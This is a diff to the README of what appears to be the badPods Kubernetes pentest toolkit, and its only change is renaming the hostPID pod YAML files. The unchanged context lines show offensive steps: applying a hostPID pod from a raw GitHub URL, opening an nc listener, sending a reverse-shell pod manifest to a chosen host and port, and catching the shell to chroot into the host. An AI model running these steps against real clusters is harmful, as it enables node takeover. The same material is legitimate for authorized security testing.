@@ -28,12 +28,12 @@ spec:
 
 #### Option 1: Create pod from local yaml 
 ```bash
-kubectl apply -f pod-hostpid.yaml   
+kubectl apply -f hostpid.yaml   
 ```
 
 #### Option 2: Create pod from github hosted yaml
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpid/pod-hostpid.yaml  
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpid/hostpid.yaml  
 ```
 
 ### Exec into pod 
@@ -60,7 +60,7 @@ spec:
   #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
   restartPolicy: Always
   ```
-[pod-hostpid-revshell.yaml](pod-hostpid-revshell.yaml)
+[hostpid-revshell.yaml](hostpid-revshell.yaml)
 
 #### Set up listener
 ```bash
@@ -70,7 +70,7 @@ nc -nvlp 3116
 #### Create the pod
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostpid/pod-hostpid-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostpid/hostpid-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
